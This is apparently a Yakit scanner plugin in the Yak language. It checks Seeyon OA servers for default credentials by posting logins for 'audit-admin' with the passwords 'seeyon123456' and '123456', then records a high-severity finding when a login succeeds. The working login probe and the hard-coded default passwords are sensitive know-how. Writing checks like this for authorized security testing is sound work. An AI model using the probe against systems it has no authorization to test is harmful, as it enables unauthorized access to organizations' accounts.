yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="seeyon default password 漏洞"
    severity=level[3]
    type="弱口令"

    poc_url_r1= url + `/seeyon/rest/authentication/ucpcLogin`
    req_r1, _ := http.NewRequest("POST",poc_url_r1,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
    http.body(`UserAgentFrom=iphone&login_username=audit-admin&login_password=seeyon123456`),)
    breq,_=http.dump(req_r1)
    resp_r1, err := http.Do(req_r1)
    die(err)
    bresp,_=http.dump(resp_r1)
    header, body = poc.Split(bresp)
    r1_flag = false
    if resp_r1.StatusCode == 200 && str.Contains(string(body),"{\"LoginOK\":\"ok\",\"loginName\":\"audit-admin\"}"){
        r1_flag = true
    }

    poc_url_r2= url + `/seeyon/rest/authentication/ucpcLogin`
    req_r2, _ := http.NewRequest("POST",poc_url_r2,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
    http.body(`UserAgentFrom=iphone&login_username=audit-admin&login_password=123456`),)
    breq,_=http.dump(req_r2)
    resp_r2, err := http.Do(req_r2)
    die(err)
    bresp,_=http.dump(resp_r2)
    header, body = poc.Split(bresp)
    r2_flag = false
    if resp_r2.StatusCode == 200 && str.Contains(string(body),"{\"LoginOK\":\"ok\",\"loginName\":\"audit-admin\"}"){
        r2_flag = true
    }

    poc_url=poc_url_r2
    if r1_flag || r2_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
